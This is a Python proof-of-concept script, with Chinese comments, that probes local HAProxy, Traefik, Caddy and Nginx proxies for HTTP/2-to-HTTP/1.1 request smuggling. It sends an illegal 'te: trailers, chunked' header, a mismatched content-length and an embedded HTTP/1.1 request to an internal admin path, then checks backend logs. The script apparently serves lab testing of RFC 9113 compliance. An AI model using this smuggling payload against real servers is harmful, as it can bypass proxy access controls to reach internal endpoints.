#!/usr/bin/env python3
"""
非法 HTTP/2 `te` 头 + CL 与走私体（HEADERS_te_response.txt）

在 HEADERS 中发送 RFC 9113 §8.2.2 禁止的 `te: trailers, chunked`（仅允许 `te: trailers`），
并声明 content-length: 4，DATA 为 ABCD + 内嵌 HTTP/1.1 请求。

合规实现：RST_STREAM(PROTOCOL_ERROR) 且不转发。
若 backend 出现 TE/Transfer-Encoding 异常或 `/poc-te-smuggled-admin`，则可能存在 H2→H1 误翻译。
"""

from __future__ import annotations

import argparse
import socket
import ssl
import subprocess
import sys
from typing import Any

from hpack import Encoder
from hyperframe.frame import (
    DataFrame,
    Frame,
    GoAwayFrame,
    HeadersFrame,
    PingFrame,
    RstStreamFrame,
    SettingsFrame,
    WindowUpdateFrame,
)

CONNECTION_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

POST_PATH = "/poc-h2-te-illegal"
# 与 txt 一致：4 字节可见体 + 紧跟伪造 H1 请求（无额外分隔）
VISIBLE = b"ABCD"
SMUGGLED = (
    b"POST /poc-te-smuggled-admin HTTP/1.1\r\n"
    b"Host: poc-te-backend.internal\r\n"
    b"Content-Length: 0\r\n"
    b"\r\n"
)
POST_BODY = VISIBLE + SMUGGLED

H2_ERRORS: dict[int, str] = {
    0x1: "PROTOCOL_ERROR",
    0x2: "INTERNAL_ERROR",
    0x5: "STREAM_CLOSED",
    0x9: "COMPRESSION_ERROR",
}


def read_exact(sock: ssl.SSLSocket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed while reading frame")
        buf += chunk
    return buf


def read_one_frame(sock: ssl.SSLSocket) -> Frame:
    header = read_exact(sock, 9)
    frame, body_len = Frame.parse_frame_header(memoryview(header))
    payload = read_exact(sock, body_len) if body_len else b""
    frame.parse_body(memoryview(payload))
    return frame


def h2_handshake(sock: ssl.SSLSocket, idle_timeout: float = 2.0) -> None:
    sock.settimeout(idle_timeout)
    while True:
        try:
            fr = read_one_frame(sock)
        except socket.timeout:
            return
        if isinstance(fr, SettingsFrame) and "ACK" not in fr.flags:
            ack = SettingsFrame(stream_id=0)
            ack.flags.add("ACK")
            sock.sendall(ack.serialize())
            continue
        if isinstance(fr, SettingsFrame) and "ACK" in fr.flags:
            continue
        if isinstance(fr, PingFrame) and "ACK" not in fr.flags:
            pk = PingFrame(stream_id=0, opaque_data=bytes(fr.opaque_data)[:8])
            pk.flags.add("ACK")
            sock.sendall(pk.serialize())
            continue
        if isinstance(fr, WindowUpdateFrame) and fr.stream_id == 0:
            continue
        return


def run_probe(
    bind_host: str,
    port: int,
    te_value: bytes,
    read_timeout: float,
    *,
    content_length_header: bytes,
    body: bytes,
    tag: str,
) -> dict[str, Any]:
    authority = f"{bind_host}:{port}"
    enc = Encoder()
    header_block = enc.encode(
        [
            (b":method", b"POST"),
            (b":scheme", b"https"),
            (b":path", POST_PATH.encode()),
            (b":authority", authority.encode()),
            (b"content-type", b"application/octet-stream"),
            (b"content-length", content_length_header),
            (b"te", te_value),
            (b"user-agent", b"PocHeadersTe/1.0 " + tag.encode("ascii", errors="replace")[:24]),
        ]
    )

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    raw = socket.create_connection((bind_host, port), timeout=10)
    tls = ctx.wrap_socket(raw, server_hostname=bind_host)
    tls.sendall(CONNECTION_PREFACE)
    tls.sendall(SettingsFrame(stream_id=0).serialize())
    h2_handshake(tls)

    tls.sendall(
        HeadersFrame(stream_id=1, data=header_block, flags=["END_HEADERS"]).serialize()
    )
    tls.sendall(DataFrame(stream_id=1, data=body, flags=["END_STREAM"]).serialize())

    events: list[str] = []
    tls.settimeout(read_timeout)
    try:
        while True:
            try:
                fr = read_one_frame(tls)
            except socket.timeout:
                events.append(f"read_timeout_{read_timeout}s")
                break
            except ConnectionError as e:
                events.append(f"connection_closed:{e}")
                break
            if isinstance(fr, GoAwayFrame):
                events.append(
                    f"GOAWAY err=0x{fr.error_code:x}({H2_ERRORS.get(fr.error_code, '?')})"
                )
                break
            if isinstance(fr, RstStreamFrame):
                err_name = H2_ERRORS.get(fr.error_code, f"0x{fr.error_code:x}")
                events.append(
                    f"RST_STREAM sid={fr.stream_id} err=0x{fr.error_code:x}({err_name})"
                )
                continue
            events.append(f"{type(fr).__name__}(sid={fr.stream_id})")
    finally:
        try:
            tls.close()
        except OSError:
            pass

    return {
        "port": port,
        "authority": authority,
        "te": te_value,
        "cl_hdr": content_length_header,
        "tag": tag,
        "events": events,
    }


def fetch_backend_logs() -> str:
    try:
        p = subprocess.run(
            ["docker", "logs", "backend", "--tail", "200"],
            capture_output=True,
            text=True,
            timeout=15,
        )
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return f"(docker logs failed: {e})"


def main() -> int:
    ap = argparse.ArgumentParser(description="H2 illegal `te` + smuggled H1 body (HEADERS_te_response)")
    ap.add_argument("--targets", nargs="*", default=["8443", "9443", "10443", "11443"])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--read-timeout", type=float, default=2.0)
    ap.add_argument("--skip-docker-logs", action="store_true")
    args = ap.parse_args()

    port_names = {8443: "haproxy", 9443: "traefik", 10443: "caddy", 11443: "nginx"}

    # txt 主例 + 额外 `te: chunked`（同样非法）
    te_cases: list[tuple[str, bytes]] = [
        ("trailers_chunked", b"trailers, chunked"),
        ("chunked_only", b"chunked"),
    ]

    # (tag, content-length 头字段值, body) — txt 故意 CL=4 与更长 DATA 不一致（H2 层可能先判畸形）
    length_modes: list[tuple[str, bytes, bytes]] = [
        ("txt_cl4_mismatch", b"4", POST_BODY),
        ("cl_match_body", str(len(POST_BODY)).encode(), POST_BODY),
    ]

    print("=== 非法 `te` + ABCD + 内嵌 POST（HEADERS_te_response.txt）===\n")
    print(
        f"POST {POST_PATH}；体前缀 {VISIBLE!r} + 走私 POST；"
        "先跑 txt 的 content-length:4（可能与 DATA 长度冲突），再跑 CL 与 DATA 一致以便单独观察 `te`。\n"
    )

    for port_s in args.targets:
        if ":" in port_s:
            port_str, label = port_s.split(":", 1)
            port = int(port_str)
        else:
            port = int(port_s)
            label = port_names.get(port, str(port))

        for te_name, te_val in te_cases:
            for lm_tag, cl_hdr, body in length_modes:
                r = run_probe(
                    args.host,
                    port,
                    te_val,
                    args.read_timeout,
                    content_length_header=cl_hdr,
                    body=body,
                    tag=f"{te_name}-{lm_tag}",
                )
                print(
                    f"[{label} :{port}] te={te_name} cl_mode={lm_tag} "
                    f"cl_hdr={r['cl_hdr']!r} body_len={len(body)}"
                )
                for ev in r["events"]:
                    print(f"  {ev}")
                print()

    if not args.skip_docker_logs:
        print("=== backend tail — 查 TE:/Transfer-Encoding:/poc-te-smuggled-admin ===\n")
        sys.stdout.write(fetch_backend_logs())

    print(
        "\n判读: RFC 9113 下非法 `te`（非仅 `trailers`）应 RST 或不得按正常请求转发。"
        "若 `poc-te-smuggled-admin` 只出现在 **同一 POST 的 body** 里（本次 Traefik/Caddy/Nginx+CL 匹配时常如此），"
        "属于整包转发，**未**实现 txt 里「后端把尾字节解析成第二条 H1 请求」的解同步。"
        "若出现 **新的独立请求行** `POST /poc-te-smuggled-admin` 或转发非法 `TE:`/`Transfer-Encoding:`，才与完整走私模型一致。"
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
